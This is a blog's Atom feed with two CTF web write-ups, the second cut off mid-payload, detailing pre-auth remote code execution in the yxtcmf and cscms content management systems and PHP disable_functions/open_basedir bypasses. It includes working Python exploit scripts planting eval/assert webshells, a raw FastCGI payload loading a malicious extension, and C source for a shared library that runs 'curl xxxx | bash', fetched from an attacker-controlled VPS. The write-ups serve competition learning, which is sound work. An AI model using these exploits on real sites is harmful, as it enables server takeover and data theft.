<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sky&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://skysec.top/"/>
  <updated>2019-06-16T15:11:15.279Z</updated>
  <id>http://skysec.top/</id>
  
  <author>
    <name>一叶飘零</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2019 强网杯final Web Writeup</title>
    <link href="http://skysec.top/2019/06/16/2019-%E5%BC%BA%E7%BD%91%E6%9D%AFfinal-Web-Writeup/"/>
    <id>http://skysec.top/2019/06/16/2019-强网杯final-Web-Writeup/</id>
    <published>2019-06-16T13:52:24.000Z</published>
    <updated>2019-06-16T15:11:15.279Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>强网杯线下赛打的非常happy也非常累，感觉这种赛制非常有意思，早就厌倦了web的AD，这种cms的0/1day的挖掘非常带劲，就是和0ctf连着打，感觉命都没了（<br>线下赛共有3道web，分别是1道框架0/1day，2道cms前台getshell的0/1day，但是Laravel框架由于可以搜到相关CVE，于是本篇文章不再编写，只分析另外2个cms。</p><h2 id="yxtcmf"><a href="#yxtcmf" class="headerlink" title="yxtcmf"></a>yxtcmf</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>拿到这道题时，我先去搜集了相关信息，可以发现该cms是一个以thinkphp+bootstrap为框架进行开。可以理解为在thinkcmf上进行的二次开发。同时了解到是thinkphp3.2.3:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> THINK_VERSION     =   <span class="string">'3.2.3'</span>;</span><br></pre></td></tr></table></figure></p><p>同时题目文档描述，告知我们：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">已经删除可用的install , admin, UpdateController.class.php和SettingController.class.php文件夹和文件，相关思路请不要尝试</span><br></pre></td></tr></table></figure></p><p>所以不难发现，给我们的cms，已经没有后台了，所以只能前台getshell（<br>那么这里我也不赘述自己踩坑的环境了，直奔主题</p><h3 id="thinkphp缓存机制问题"><a href="#thinkphp缓存机制问题" class="headerlink" title="thinkphp缓存机制问题"></a>thinkphp缓存机制问题</h3><p>既然知道cms开发框架为thinkphp 3，那么势必会去搜集相关框架漏洞信息(因为yxtcmf搜到东西太少了)，除去搜到的一些注入问题，最能直接getshell的便是cache缓存机制的问题。<br>在如下文章：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://paper.seebug.org/374/</span><br></pre></td></tr></table></figure></p><p>可以发现如果我们可以利用缓存机制，并计算出缓存文件名，控制缓存内容，即可getshell。</p><h3 id="cache文件名"><a href="#cache文件名" class="headerlink" title="cache文件名"></a>cache文件名</h3><p>这里我们跟进yxtcmf的源代码，来到相关文件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yxtedu/Core/Library/Think/Cache/Driver/File.class.php</span><br></pre></td></tr></table></figure></p><p>可以发现cache文件的命名规则如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filename</span><span class="params">($name)</span> </span>&#123;</span><br><span class="line">        $name=md5(C(<span class="string">'DATA_CACHE_KEY'</span>).$name);</span><br><span class="line">        <span class="keyword">if</span>(C(<span class="string">'DATA_CACHE_SUBDIR'</span>)) &#123;</span><br><span class="line">            <span class="comment">// 使用子目录</span></span><br><span class="line">            $dir   =<span class="string">''</span>;</span><br><span class="line">            <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;C(<span class="string">'DATA_PATH_LEVEL'</span>);$i++) &#123;</span><br><span class="line">                $dir.=$name&#123;$i&#125;.<span class="string">'/'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!is_dir(<span class="keyword">$this</span>-&gt;options[<span class="string">'temp'</span>].$dir)) &#123;</span><br><span class="line">                mkdir(<span class="keyword">$this</span>-&gt;options[<span class="string">'temp'</span>].$dir,<span class="number">0755</span>,<span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $filename=$dir.<span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>].$name.<span class="string">'.php'</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $filename=<span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>].$name.<span class="string">'.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;options[<span class="string">'temp'</span>].$filename;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>我们关注到相关信息：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$name=md5(C(<span class="string">'DATA_CACHE_KEY'</span>).$name);</span><br></pre></td></tr></table></figure></p><p>跟进变量<code>DATA_CACHE_KEY</code>:<br><img src="/images/2019-06-16-22-13-45.png" alt=""><br>不难发现，该值为空，故此cache文件名为固定值，我们可在本地运行代码，拿到cache文件名。</p><h3 id="cache文件内容"><a href="#cache文件内容" class="headerlink" title="cache文件内容"></a>cache文件内容</h3><p>知道了cache文件名，那么如何控制cache的文件内容呢？<br>在开发手册中提及，我们可以使用S()进行缓存：<br><img src="/images/2019-06-16-22-19-33.png" alt=""><br>我们跟进S()函数，发现最后会进入set方法：<br><img src="/images/2019-06-16-22-23-44.png" alt=""><br>我们继续跟进set方法：<br><img src="/images/2019-06-16-22-25-05.png" alt=""><br>不难发现文件内容的写入操作。注意到写入时候，会默认在最前面加上注释符<code>\\</code>，所以我们可以用换行符bypass，例如：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\nvar_dump($_GET[a]);</span><br></pre></td></tr></table></figure></p><p>即可bypass注释符。<br>既然知道通过S函数可以控制cache文件内容，那么就需要找如何触发该函数。<br>我们全局搜索<code>S(</code>，可以发现如下路径中，sp_set_dynamic_config有调用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">application/Common/Common/function.php</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-06-16-22-30-47.png" alt=""><br>我们关注变量$configs，发现其会与传入的$data进行array_merge，所以可认为写入内容可控。</p><h3 id="cache写入路由"><a href="#cache写入路由" class="headerlink" title="cache写入路由"></a>cache写入路由</h3><p>故此我们可以全局搜索函数<code>sp_set_dynamic_config</code>，查找调用处：<br><img src="/images/2019-06-16-22-33-33.png" alt=""><br>我们可以发现大量路由有相关调用，但是否真的可以使用呢？答案是否定的，由于该cms删除了后台，以至于所有需要后台登录的路由均无法使用，一旦调用，则会触发后台文件入口里的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header(&quot;Location: ../index.php?g=admin&amp;m=public&amp;a=login&quot;.$upw );</span><br></pre></td></tr></table></figure></p><p>进行重定向跳转，所以我们必须要找无需后台登入的路由，以达到我们的目的。<br>这里我寻找的方式比较简单，只要找到没有继承<code>AdminbaseController</code>类的即可。<br>那么不难发现，在如下文件中，我们可以利用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">application/Api/Controller/OauthController.class.php</span><br></pre></td></tr></table></figure></p><p>关注到其调用函数处：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">injectionAuthocode</span><span class="params">()</span></span>&#123;</span><br><span class="line">       $postdata=I(<span class="string">'post.'</span>);</span><br><span class="line">       $configs[<span class="string">"authoCode"</span>]=$postdata[<span class="string">'authoCode'</span>];</span><br><span class="line">       sp_set_dynamic_config($configs);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>发现我们可以直接通过post传参控制$postdata的值，并利用sp_set_dynamic_config写入缓存文件。</p><h3 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h3><p>那么整个利用方式就非常清晰了：<br>1.使用如下路由，POST发送恶意数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?g=api&amp;m=oauth&amp;a=injectionAuthocode</span><br></pre></td></tr></table></figure></p><p>2.由于injectionAuthocode方法调用了sp_set_dynamic_config方法，而sp_set_dynamic_config调用了S()，导致我们的恶意数据被写入cache。<br>3.访问cache文件getshell。<br>exp如下：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">host=<span class="string">'http://192.168.43.85/'</span></span><br><span class="line">url=host+<span class="string">'index.php?g=api&amp;m=oauth&amp;a=injectionAuthocode'</span></span><br><span class="line">data = &#123;</span><br><span class="line"> <span class="string">'authoCode'</span>:<span class="string">'\nvar_dump($_GET[a]); @eval($_GET[a]);#'</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url,data=data)</span><br><span class="line">url = host+<span class="string">'data/runtime/Temp/ed182ead0631e95e68e008bc1d3af012.php'</span></span><br><span class="line">data = &#123;</span><br><span class="line">  <span class="string">'a'</span>:<span class="string">"system(\"ls\");"</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url,params=data)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><h2 id="cscms"><a href="#cscms" class="headerlink" title="cscms"></a>cscms</h2><h3 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>拿到该题后，我第一时间与github上的版本进行了diff，发现如下信息:<br><img src="/images/2019-06-16-22-40-59.png" alt=""><br>给我们的版本是4.1.75，时间为20170715，而github版本为4.1.8，时间为20170825。<br>而在cscms官方网站中给出过相关补丁信息：<br><img src="/images/2019-06-16-22-42-21.png" alt=""><br>于是我迅速的将目光锁定在了模板注入上，但很遗憾，官网的补丁下载下来的内容为空，我查询相关漏洞描述也一无所获，于是决定自己手动挖掘。</p><h3 id="漏洞点发掘"><a href="#漏洞点发掘" class="headerlink" title="漏洞点发掘"></a>漏洞点发掘</h3><p>首先全局搜索危险函数，例如eval、system、assert等，不难发现如下位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload/cscms/app/models/Csskins.php</span><br></pre></td></tr></table></figure></p><p>其中存在如下函数:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cscms_php</span><span class="params">($php,$content,$str)</span> </span>&#123;</span><br><span class="line">$evalstr=<span class="string">" return $content"</span>;</span><br><span class="line">$newsphp=<span class="keyword">eval</span>($evalstr);</span><br><span class="line">      $str=str_replace($php,$newsphp,$str);</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>我们注意到这里有明显的eval函数调用，那么我们查阅什么位置使用了该函数：<br><img src="/images/2019-06-16-22-48-24.png" alt=""><br>发现在upload/cscms/app/models/Csskins.php中template_parse函数调用了cscms_php函数，而template_parse正是模板解析函数，与我们的信息搜集部分照相呼应。</p><h3 id="模板解析函数"><a href="#模板解析函数" class="headerlink" title="模板解析函数"></a>模板解析函数</h3><p>那么该函数如何解析php语句呢？<br>我们注意到相关操作:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">preg_match_all(<span class="string">'/&#123;cscmsphp&#125;([\s\S]+?)&#123;\/cscmsphp&#125;/'</span>,$str,$php_arr);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($php_arr[<span class="number">0</span>]))&#123;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($php_arr[<span class="number">0</span>]);$i++)&#123;</span><br><span class="line">    $str=<span class="keyword">$this</span>-&gt;cscms_php($php_arr[<span class="number">0</span>][$i],$php_arr[<span class="number">1</span>][$i],$str);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>($php_arr);</span><br></pre></td></tr></table></figure></p><p>发现解析时会进行正则匹配，取出如下部分：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/&#123;cscmsphp&#125;([\s\S]+?)&#123;\/cscmsphp&#125;/</span><br></pre></td></tr></table></figure></p><p>我们可以使用类似于：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;cscmsphp&#125;phpinfo();&#123;/cscmsphp&#125;</span><br></pre></td></tr></table></figure></p><p>来执行命令。</p><h3 id="模板渲染路由"><a href="#模板渲染路由" class="headerlink" title="模板渲染路由"></a>模板渲染路由</h3><p>既然找到了相关执行php语句的函数，那么只差一个调用该函数的路由了。依旧是全局搜索：<br><img src="/images/2019-06-16-22-56-58.png" alt=""><br>可以发现在留言板功能中有所调用，而调用位置我们看到，在gbook<em>list方法中：<br><img src="/images/2019-06-16-23-04-12.png" alt=""><br>其会从数据库中取出留言，然后进行渲染，那么如果想要触发模板渲染攻击，势必需要在留言插入时，就写入恶意数据，我们查看留言写入路由：<br><img src="/images/2019-06-16-23-05-09.png" alt=""><br>即调用add即可写入数据，插入数据库。<br>同时经过本地测试发现：<br>![](/images/41560697631</em>.pic.jpg)<br>单引号会被转义，但我们的shell无需单引号：<br><img src="/images/21560697598_.pic.jpg" alt=""><br>并且在访问index.php/gbook/lists/1时，会触发相关代码：<br><img src="/images/31560697606_.pic.jpg" alt=""></p><h3 id="exp编写-1"><a href="#exp编写-1" class="headerlink" title="exp编写"></a>exp编写</h3><p>故此整个流程变得非常容易：<br>首先访问路由：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.85/upload/index.php/gbook</span><br></pre></td></tr></table></figure></p><p>进行留言，留言内容为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;cscmsphp&#125;assert($_GET[sky]);&#123;/cscmsphp&#125;</span><br></pre></td></tr></table></figure></p><p>然后运行脚本，可进行RCE：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">host=<span class="string">'http://192.168.43.85/'</span></span><br><span class="line">url=host+<span class="string">'upload/index.php/gbook/lists/1'</span></span><br><span class="line">data = &#123;</span><br><span class="line"> <span class="string">'sky'</span>:r<span class="string">"system('ls');"</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url=url,params=data)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>总体来说，这样的竞技模式更加有趣，更贴近真实情况，可以让参赛人员在比赛过程中提高对cms漏洞挖掘能力，对这样的赛制表示点赞~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;强网杯线下赛打的非常happy也非常累，感觉这种赛制非常有意思，早就厌倦了web的AD，这种cms的0/1day的挖掘非常带劲，就是和0ct
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019 0ctf final Web Writeup（1）</title>
    <link href="http://skysec.top/2019/06/10/2019-0ctf-final-Web-Writeup/"/>
    <id>http://skysec.top/2019/06/10/2019-0ctf-final-Web-Writeup/</id>
    <published>2019-06-10T07:38:25.000Z</published>
    <updated>2019-07-02T14:16:10.640Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>鸽了好久的Blog，因为自己事务缠身，一直没时间写一下最近比赛的题解，趁近日有空，来填坑~<br>第一次参加0ctf新星赛就拿了冠军，还是非常开心的。比赛过程中，web共4道题，我有幸做出3道，java实在不太擅长，哭了（，另一道是ocaml的题目，涉及小trick和逻辑问题，准备放在后面和java一起编写（希望不要咕咕咕了）。这里写出另外两道题目的题解如下：</p><h2 id="114514-calcalcalc"><a href="#114514-calcalcalc" class="headerlink" title="114514_calcalcalc"></a>114514_calcalcalc</h2><p>本题是2019 RCTF calcalcalc的改版，这次限制了之前的时间延迟注入的问题，同时需要Bypass validator：<img src="/images/2019-07-02-20-41-31.png" alt=""><br>我们可以使用<code>__proto__</code>来进行Bypass：<br><img src="/images/2019-07-02-20-42-54.png" alt=""><br>至于时间注入的问题，我们可以使用bool注入来解决这个问题：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"__proto__"</span>: &#123;&#125;, <span class="string">"isVip"</span>: true, <span class="string">"expression"</span>: <span class="string">"1//1 and ord(open('/flag').read()[1]) &gt;-1 and 1\n"</span>&#125;</span><br></pre></td></tr></table></figure></p><p>php下：<br><img src="/images/2019-07-02-20-33-27.png" alt=""><br>nodejs下：<br><img src="/images/2019-07-02-20-34-37.png" alt=""><br>python下：<br><img src="/images/2019-07-02-20-34-48.png" alt=""><br>当<code>ord(open(&#39;/flag&#39;).read()[1]) &gt;-1</code>成立时，python返回1，与另外两个保持一致。当<code>ord(open(&#39;/flag&#39;).read()[1]) &gt;-1</code>不成立时，返回<code>That&#39;s classified information. - Asahina Mikuru</code>。故此可以进行bool注入：<br><img src="/images/2019-07-02-16-12-39.png" alt=""></p><h2 id="wallbreaker-not-very-hard"><a href="#wallbreaker-not-very-hard" class="headerlink" title="wallbreaker_not_very_hard"></a>wallbreaker_not_very_hard</h2><p>本题是2019 0ctf online和2019 *CTF的难度提升题，拿到题目较为明显的2个条件：<br>首先是disable_function，过滤了如下函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wall B: pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,putenv,proc_open,passthru,symlink,link,syslog,imap_open,dl,system,mb_send_mail,mail,error_log</span><br></pre></td></tr></table></figure></p><p>然后是open_basedir限制了如下目录：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wall C: /var/www/html:/tmp</span><br></pre></td></tr></table></figure></p><p>题目提示我们：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Here&apos;s a backdoor, to help you break Wall A.</span><br><span class="line">But you should find the key of the backdoor.</span><br></pre></td></tr></table></figure></p><p>于是进行目录爆破，得到如下文件泄露：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.106:10001/.index.php.swp</span><br></pre></td></tr></table></figure></p><p>打开后发现后门:<br><img src="/images/2019-07-01-22-24-13.png" alt=""><br>这里很自然想到*CTF的解法：<br><a href="https://github.com/sixstars/starctf2019/tree/master/web-echohub" target="_blank" rel="noopener">https://github.com/sixstars/starctf2019/tree/master/web-echohub</a><br>那么既然需要使用<code>stream_socket_client</code>和<code>stream_socket_sendto</code>连接php-fpm服务，那么我们需要知道<code>unix:///run/php/php7.3-fpm.sock</code>文件名，那么肯定需要Bypass open_basedir。<br>这里容易想到之前的相关poc，参考链接如下：<br><a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/">https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/</a><br>尝试构造：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">chdir(<span class="string">'/tmp'</span>);</span><br><span class="line">mkdir(<span class="string">'sky'</span>);</span><br><span class="line">chdir(<span class="string">'sky'</span>);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);</span><br><span class="line">var_dump(ini_get(<span class="string">'open_basedir'</span>));</span><br><span class="line">var_dump(glob(<span class="string">'*'</span>));</span><br></pre></td></tr></table></figure></p><p>发现可以成功bypass open_basedir<br><img src="/images/2019-07-01-22-43-21.png" alt=""><br>通过列目录，可找到文件名如下：<br><img src="/images/2019-07-01-22-48-35.png" alt=""><br>但尝试使用<code>/var/run/php/U_wi11_nev3r_kn0w.sock</code>，并使用*ctf exp时，发现依然会被disable function限制，那么显然我们还得继续bypass disable function。<br>那么自然容易想到寻找引入拓展的地方，引入一个hack.so文件，hook函数，达到RCE的目的，这一点和之前2019 0ctf online的时候非常相似，这是当时已经给了现成的拓展和可用函数。<br>这里可以参考ph牛的文章：<br><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a><br>在文章中，ph牛剖析的非常透彻，可以帮助我们理解PHP-FPM未授权访问漏洞，既然知道了我们需要构造fastcgi协议和fpm进行通信。<br>那么势必需要找到fastcgi中是否有更改disable_functions的选项，或者引入extension的选项。同时利用auto_prepend_file和auto_append_file让php执行任意代码。并且文中提及，PHP-FPM的两个环境变量，PHP_VALUE和PHP_ADMIN_VALUE。这两个环境变量就是用来设置PHP配置项的，PHP_VALUE可以设置模式为PHP_INI_USER和PHP_INI_ALL的选项，PHP_ADMIN_VALUE可以设置所有选项。但disable_functions除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中。<br><img src="/images/2019-07-02-13-08-58.png" alt=""><br>所以思路更加明确了，我们应该是要找到PHP_ADMIN_VALUE的某个选项，可以帮助我们引入extension。<br>搜索易得,我们可以利用如下方式，引入指定位置的so文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP_ADMIN_VALUE[&apos;extension&apos;] = /tmp/sky.so</span><br></pre></td></tr></table></figure></p><p> 这里我们改写ph牛提供的脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-07-02-13-19-29.png" alt=""><br>可以构造出如下exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%01%01%F8%F1%00%08%00%00%00%01%00%00%00%00%00%00%01%04%F8%F1%01%DC%00%00%0E%02CONTENT_LENGTH19%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%17PHP_ADMIN_VALUEextension%20%3D%20/tmp/sky.so%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%F8%F1%00%00%00%00%01%05%F8%F1%00%13%00%00%3C%3Fphp%20phpinfo%28%29%3B%20%3F%3E%01%05%F8%F1%00%00%00%00</span><br></pre></td></tr></table></figure></p><p>但在使用之前，我们需要首先在/tmp目录下上传一个恶意so文件，我们利用如下github项目进行构造：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"curl xxxx | bash"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后编译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC sky.c -o sky</span><br><span class="line">gcc --share sky -o sky.so</span><br></pre></td></tr></table></figure></p><p>接着将sky.so进行上传<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$upload = <span class="string">'/tmp/sky.so'</span>;</span><br><span class="line"><span class="keyword">echo</span> copy(<span class="string">"http://vps_ip/sky.so"</span>, $upload);</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-07-02-15-14-44.png" alt=""><br>最后我们整合上述exp，给出完整Payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$fp = stream_socket_client(&quot;/var/run/php/U_wi11_nev3r_kn0w.sock&quot;, $errno, $errstr,30);$out = 